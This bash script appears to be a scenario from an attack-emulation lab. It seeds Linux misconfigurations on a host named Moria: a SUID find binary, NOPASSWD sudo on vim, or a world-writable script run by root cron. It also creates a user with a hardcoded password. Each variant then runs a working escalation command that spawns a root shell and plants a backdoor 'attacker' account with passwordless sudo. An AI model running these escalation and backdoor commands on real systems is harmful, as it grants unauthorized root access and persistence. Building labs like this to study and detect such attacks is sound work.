#!/usr/bin/env bash
# S02 — Linux privilege escalation (SUID / sudo / cron misconfig) on Moria.
# Attacker works through the FOOTHOLD_USER foothold. Params: VARIANT (1=A SUID,
# 2=B sudoers, 3=C writable cron). See scenarios/S02-linux-privesc.md.
run_scenario() {
  local FU="$FOOTHOLD_USER"

  step "setup: ensure foothold user exists, then seed misconfig variant $VARIANT"
  on_lin "setup-user" "sudo useradd -m -s /bin/bash '$FU' 2>/dev/null; echo '$FU:Autumn2026' | sudo chpasswd"

  case "$VARIANT" in
    1) # A — SUID binary abuse (GTFOBins: find)
       on_lin "seed-A" "sudo chmod u+s /usr/bin/find"
       note "variant A: SUID bit set on /usr/bin/find"
       step "escalate via SUID find, then a root action"
       on_lin_as "$FU" "escalate-A" \
         "find . -exec /bin/sh -p -c 'id; echo \"attacker ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers.d/lab; useradd -M -s /bin/bash attacker 2>/dev/null; id attacker' \\; -quit"
       ;;
    2) # B — sudoers NOPASSWD on an editor
       on_lin "seed-B" "echo '$FU ALL=(ALL) NOPASSWD: /usr/bin/vim' | sudo tee /etc/sudoers.d/lab >/dev/null"
       note "variant B: NOPASSWD vim for $FU in /etc/sudoers.d/lab"
       step "escalate via sudo vim shell, then a root action"
       on_lin_as "$FU" "escalate-B" \
         "sudo vim -E -c ':!/bin/sh -c \"id; useradd -M -s /bin/bash attacker 2>/dev/null; id attacker\"' -c ':q!' /dev/null"
       ;;
    3) # C — root cron running a user-writable script
       on_lin "seed-C" "sudo mkdir -p /opt/jobs; sudo tee /etc/cron.d/labjob >/dev/null <<<'* * * * * root /opt/jobs/run.sh'; sudo chmod 777 /opt/jobs; sudo touch /opt/jobs/run.sh; sudo chmod 777 /opt/jobs/run.sh"
       note "variant C: root cron /etc/cron.d/labjob runs world-writable /opt/jobs/run.sh"
       step "plant payload in the writable script; root cron will run it"
       on_lin_as "$FU" "escalate-C" \
         "printf '#!/bin/sh\\nuseradd -M -s /bin/bash attacker 2>/dev/null\\necho \"attacker ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers.d/lab\\n' > /opt/jobs/run.sh; chmod +x /opt/jobs/run.sh"
       note "payload planted; fires on next cron minute (not immediate)"
       ;;
  esac

  noise_lin
}
